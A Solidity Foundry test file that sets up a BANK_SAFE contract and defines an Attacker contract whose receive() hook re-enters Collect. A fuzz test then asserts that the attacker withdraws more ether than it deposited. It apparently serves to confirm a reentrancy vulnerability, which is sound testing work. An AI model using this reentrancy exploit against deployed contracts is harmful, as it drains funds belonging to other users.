
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {BANK_SAFE, LogFile} from "../src/BANK_SAFE.sol";

contract TestReentrancyBANK_SAFE is Test {
    BANK_SAFE public _contractUnderTest;
    LogFile public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _logFile = new LogFile();
        _contractUnderTest = new BANK_SAFE();
        _contractUnderTest.SetLogFile(address(_logFile));
        _contractUnderTest.SetMinSum(0.01 ether);
        _contractUnderTest.Initialized();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsCollectMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal >= 0.01 ether && attackVal <= 10 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // The vulnerable function Collect requires balances[msg.sender] >= MinSum && balances[msg.sender] >= _am
        // This is handled in setupAttack by depositing funds

        // --- 3. Funding ---
        // Fund the Victim contract with extra ETH (so attacker can drain more than deposited)
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // Fund the Attacker
        vm.deal(address(_attacker), attackVal * 2);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    BANK_SAFE public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = BANK_SAFE(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        // Deposit funds to satisfy the balance check in Collect
        _victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        // Capture Initial State
        initialSnapshot = address(this).balance;
        
        // Store the value for the re-entrant call
        storedAttackVal = val;

        // Call the vulnerable function Collect
        _victim.Collect(val);

        // Verify Success Conditions
        // If we managed to call Collect multiple times via reentrancy
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
        
        // Also check if we extracted more than we deposited
        if (address(this).balance > initialSnapshot + storedAttackVal) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        
        // Re-enter if we haven't done so yet and victim still has funds
        if (attackCallCount < 2 && address(_victim).balance >= storedAttackVal) {
            _victim.Collect(storedAttackVal);
        }
    }
}
